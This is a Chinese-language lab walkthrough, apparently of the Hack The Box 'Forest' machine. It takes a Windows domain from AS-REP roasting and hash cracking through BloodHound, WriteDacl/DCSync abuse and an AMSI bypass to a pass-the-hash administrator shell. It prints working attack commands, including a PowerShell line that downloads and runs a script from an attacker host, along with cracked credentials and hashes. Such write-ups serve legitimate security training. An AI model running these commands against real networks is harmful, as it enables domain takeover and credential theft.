## 信息收集

```


nmap -sV -sS -Pn -A -p1-65535 10.10.10.161
```

```


Nmap scan report for 10.10.10.161
```

我们发现可以进行匿名登录，我们尝试匿名登录SMB服务，看看有哪些有价值的信息![](../Images/87b754b4d69aacba71accc987f030345.png)答案是没有，没有什么共享信息![](../Images/a99dc57109e8b05a033ffa1d25b92fb2.png)上面信息收集时发现了ldap服务，那我们尝试使用ldapsearch工具对`namingcontexts`字段进行发掘![](../Images/6dbaad59736e0c02ad32f2519e4ceee3.png)我们尝试更深入地挖掘DN信息，并尝试获取域中的用户列表![](../Images/b4614fe423b598330a74099b65ffdfc3.png)我们还可以使用`enum4linux`获取用户![](../Images/a7d50ea158dcdac28c46dc5133fa15b9.png)我们将搜集的信息保存为一个`anon_ldap.txt`文件，过滤出`svc-alfresco`用户的信息![](../Images/ae6dba05f3e604a7d4dce578d9aba95f.png)那我们拿到账号和用户名后，我们得检查一下是否启用了预认证，这里解释一下什么是预认证

> 在请求 TGT（票证授予票证）时，第一步，请求方（用户）使用自己的 NTLM 哈希加密时间戳，并将其发送到 KDC（密钥分发中心），即域控制器。现在，如果 KDC 使用请求用户的 NTLM 哈希成功解密时间戳，KDC 将知道请求用户是有效用户。可以禁用此检查（这不是默认情况）。在这种情况下，KDC 不会验证请求 TGT 的用户是否有效，而是将 TGT 发送回请求者。该 TGT 包含使用请求用户的 NTLM 哈希加密的部分数据，这意味着我们可以将哈希脱机并尝试破解它。

那我们可以使用`impacket`包中的`GetNPUsers.py`这个脚本去请求TGT，直接获取易受攻击的用户名及对应的哈希值![](../Images/851f6b6e1a5e5919aaa63158125d4556.png)我们使用`john`来破解这个hash值，破解的明文值为`s3rvice`![](../Images/d71eadcebccf39efa049bb2b857049d7.png)我们也可以用hashcat来破解

```


hashcat -m 18200 -a 0 -w 3 forest.hash /usr/share/wordlists/rockyou.txt
```

![](../Images/05ceda95f6db83924db01fa7c1d84362.png)因为上边我们扫描到主机开放了5985端口，那证明主机开放了WinRM服务

```


evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

## 提权

我们使用Bloodhound这个工具查询是否有潜在的提权路径，首先我们得先把客户端`SharpHound.exe`上传到目标主机上，并运行它![](../Images/1961ef62749110983cface0dd56b9a0f.png)![](../Images/95e5b38d2b8124749c4421cccf300879.png)为了方便我们传输，我们在本机上搭建一个SMB服务器![](../Images/c8aa52662e43dc7f0b767ea3b5a5b052.png)然后我们将压缩包复制到本机上![](../Images/af5983bb68d8fc4d53938812f4109acb.png)在攻击机上启动bloodhound，并将压缩包拖进bloodhound中![](../Images/735d4627cc50f316ee880eda60e94781.png)然后点击最后一个选项，查看可以进行哈希传递的用户![](../Images/7bbad41671f8a12e36ac9a8946843e0a.png)

然后再点击这个选项

![](../Images/49acedb7af762009a318a33fb1adf92b.png)

![](../Images/49a50155ed8cc00c686c4f7484b78b53.png)可以看到`svc-alfresco`这个用户是属于`service account`这个组的成员，同时它也是`Privileged IT Accounts`的成员，它也是`account operators`的成员。它允许该组的成员创建和修改用户并将其添加到不受保护的组![](../Images/fc059852c52a116146fdf513e1991ea4.png)那我们现在点击`Shortest Paths to High Value Targets`，查看去往高权限目标的路径。该用户具有`GenericAll`的权限和`Exchange Windows`权限组。在`Exchange Windows`权限组具有`WriteDacl`在域的权限。该`WriteDacl`权限使用户能够向对象添加`DACL`（自由访问控制列表）。![](../Images/c2e58f2fd19a7215f0844541ae89f09a.png)**那就意味着：**

1.  我们可以将用户添加到Exchange Windows 权限组
2.  然后，由于 Exchange 组有WriteDacl权限，我们可以将DCSync权限授予我们创建的用户

> \*\*DCsync是几个权限的集合体，是域渗透中经常会用到的技术，如果普通用户想具有DCsync权限，可以给对象添加以下三条ACE：

*   DS-Replication-Get-Changes，对应GUID为：1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
*   DS-Replication-Get-Changes-All，对应GUID为：1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
*   DS-Replication-Get-Changes-In-Filtered-Set，对应GUID为：89e95b76-444d-4c62-991a-0facbeda640c\*\*

## DCSync

首先我们先将用户添加到域中![](../Images/6a638af55c461185d0d83e5e54e3210f.png)然后我们将用户添加到`Exchange Windows`权限组![](../Images/d118e6ba595c87c2397690c7ec83a37e.png)我们看看菜单，我们选择`Bypass-4MSI`，`Bypass-4MSI`命令用于在导入脚本之前规避防御者。接下来，我们可以使用`Add-ObjectACL`和`john`的凭证，并给他`DCSync`权限。![](../Images/bd16c423c2b1380a86895316edad3afb.png)然后输入以下的powershell的代码

```


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11/PowerView.ps1')
```

开启一个小型服务器![](../Images/e720498b3c2641c1f4635ae17065b82c.png)执行完成后，我们使用`secretdumps.py`脚本获取用户名对应的哈希值。这里我们获取到了管理员的哈希值![](../Images/ae276ee0d5d171aa0896928b6e92b418.png)那么我们只需要使用`psexec.py`脚本来进行哈希传递攻击，获取到超级管理员权限

```


psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```
